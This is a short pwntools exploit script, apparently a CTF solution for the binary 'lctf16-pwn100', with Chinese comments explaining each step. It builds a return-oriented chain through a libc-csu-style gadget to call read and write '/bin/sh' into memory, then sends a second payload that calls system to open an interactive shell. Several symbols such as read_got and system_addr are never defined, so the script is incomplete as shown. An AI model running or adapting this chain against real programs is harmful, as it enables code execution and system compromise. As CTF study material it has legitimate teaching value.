from pwn import *

p = process('./lctf16-pwn100')

payload = b'a' * 72 + p64(0x40075a) + p64(0) + p64(1) + p64(read_got) + p64(8) + p64(0x601000) + p64(0) + p64(0x400740) #0、1两个参数固定，0配合第二段代码的call，由于是call指令第三个参数用got，随后是read函数的三个参数，返回0x400740调用第二段代码
payload += b'a' * 56 + p64(start_addr) #栈指针移动了56字节，填充56字节
payload += b'a' * (200 - len(payload))
p.send(payload)
p.recvuntil('~\n')
p.send('/bin/sh\x00')

payload = 'a' * 72 + p64(pop_rdi) + p64(0x601000) + p64(system_addr) + p64(0xdeadbeef)
payload += 'a' * (200 - len(payload))
p.send(payload)
p.interactive()